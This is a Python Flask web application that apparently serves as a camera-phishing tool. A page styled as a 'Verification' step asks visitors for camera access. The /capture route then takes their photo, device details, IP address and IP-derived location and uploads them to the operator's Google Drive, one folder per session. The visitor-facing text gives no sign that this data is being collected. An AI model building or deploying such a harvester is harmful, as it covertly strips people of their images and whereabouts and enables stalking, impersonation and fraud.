import os
import uuid
import json
import requests
import pytz
from datetime import datetime
from io import BytesIO

from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import Flow
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseUpload

app = Flask(__name__)
app.secret_key = os.getenv('FLASK_SECRET_KEY', 'replace-me-with-a-strong-secret')

# --------------------------------------------------------------------
# 1. Static configuration (unchanged)
# --------------------------------------------------------------------
def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except Exception:
        return {
            "site_title": "Verification",
            "greeting_message": "Please start the process",
            "button_text": "Start",
            "loading_message": "Capturing…",
            "denied_message": "Camera permission is required. Close the tab."
        }

# --------------------------------------------------------------------
# 2. OAuth 2.0 helpers
# --------------------------------------------------------------------
CLIENT_SECRETS_FILE = 'client_secret.json'          # Downloaded from GCP console
SCOPES = ['https://www.googleapis.com/auth/drive.file']   # Only files created by the app

# Build a flow object each time we need a new auth URL
def get_flow():
    return Flow.from_client_secrets_file(
        CLIENT_SECRETS_FILE,
        scopes=SCOPES,
        redirect_uri=os.getenv('REDIRECT_URI')
    )

# Load stored refresh token, if it exists
def load_token():
    if os.path.exists('token.json'):
        with open('token.json', 'r') as f:
            data = json.load(f)
            return Credentials(**data)
    return None

# Persist the refreshed token
def save_token(creds: Credentials):
    with open('token.json', 'w') as f:
        json.dump({
            'token': creds.token,
            'refresh_token': creds.refresh_token,
            'token_uri': creds.token_uri,
            'client_id': creds.client_id,
            'client_secret': creds.client_secret,
            'scopes': creds.scopes,
        }, f)

# Build the Drive service, refreshing the token if needed
def get_drive_service():
    creds = load_token()
    if not creds:
        raise RuntimeError("No OAuth credentials. Visit /authorize first.")
    if creds.expired and creds.refresh_token:
        creds.refresh(requests.Request())
        save_token(creds)
    return build('drive', 'v3', credentials=creds)

# --------------------------------------------------------------------
# 3. IP → geo‑lookup (unchanged)
# --------------------------------------------------------------------
def ip_location(ip):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        d = r.json()
        if d['status'] == 'success':
            return {
                'country': d.get('country', ''),
                'city': d.get('city', ''),
                'lat': d.get('lat'),
                'lon': d.get('lon')
            }
    except Exception:
        pass
    return {'country': 'Unknown', 'city': 'Unknown', 'lat': None, 'lon': None}

# --------------------------------------------------------------------
# 4. Routes
# --------------------------------------------------------------------
@app.route('/')
def index():
    cfg = load_config()
    return render_template('index.html', cfg=cfg)

# 4a. OAuth start
@app.route('/authorize')
def authorize():
    flow = get_flow()
    auth_url, state = flow.authorization_url(
        access_type='offline',  # get a refresh token
        include_granted_scopes='true',
        prompt='consent'       # force consent to get refresh_token even if already authorized
    )
    session['state'] = state
    return redirect(auth_url)

# 4b. OAuth callback
@app.route('/oauth2callback')
def oauth2callback():
    state = session.get('state')
    flow = get_flow()
    flow.fetch_token(authorization_response=request.url, state=state)
    creds = flow.credentials
    save_token(creds)
    return redirect(url_for('index'))

# 4c. Capture endpoint (unchanged except for drive_service call)
@app.route('/capture', methods=['POST'])
def capture():
    # Basic checks
    if 'image' not in request.files:
        return jsonify({'error': 'No image'}), 400

    img_file = request.files['image']
    meta_json = request.form.get('metadata')
    client_meta = json.loads(meta_json) if meta_json else {}

    # Server‑side enrichment
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = request.headers.get('User-Agent', 'Unknown')
    ts = datetime.now(pytz.utc)
    sess_id = str(uuid.uuid4())[:8]
    loc = ip_location(ip)

    meta_txt = f"""=== USER SESSION METADATA ===
Session ID: {sess_id}
Timestamp (UTC): {ts.isoformat()}

--- DEVICE INFO ---
Model: {client_meta.get('deviceInfo', {}).get('model', 'Unknown')}
OS: {client_meta.get('deviceInfo', {}).get('os', 'Unknown')}
Browser: {client_meta.get('deviceInfo', {}).get('browser', 'Unknown')}
Screen Res: {client_meta.get('deviceInfo', {}).get('screenRes', 'Unknown')}

--- NETWORK & LOCATION ---
IP Address: {ip}
User Agent: {ua}
Country: {loc.get('country')}
City: {loc.get('city')}
GPS Lat: {loc.get('lat', 'N/A')}
GPS Lon: {loc.get('lon', 'N/A')}
=== END METADATA ===
"""

    try:
        drive_service = get_drive_service()

        # Create a dedicated folder for this session
        folder_name = f"User_{sess_id}_{ts.strftime('%Y-%m-%d_%H-%M-%S')}"
        folder_body = {
            'name': folder_name,
            'mimeType': 'application/vnd.google-apps.folder',
            'parents': [os.getenv('ROOT_DRIVE_FOLDER_ID')]
        }
        folder = drive_service.files().create(body=folder_body, fields='id').execute()
        folder_id = folder.get('id')

        # Upload metadata.txt
        meta_bytes = meta_txt.encode('utf-8')
        meta_body = {'name': 'metadata.txt', 'parents': [folder_id]}
        meta_media = MediaIoBaseUpload(BytesIO(meta_bytes), mimetype='text/plain')
        drive_service.files().create(body=meta_body, media_body=meta_media).execute()

        # Upload the captured image
        img_bytes = img_file.read()
        img_name = f"capture_{ts.strftime('%H-%M-%S-%f')}.jpg"
        img_body = {'name': img_name, 'parents': [folder_id]}
        img_media = MediaIoBaseUpload(BytesIO(img_bytes), mimetype='image/jpeg')
        drive_service.files().create(body=img_body, media_body=img_media).execute()

        return jsonify({'status': 'ok', 'folder_id': folder_id, 'session_id': sess_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 10000)))
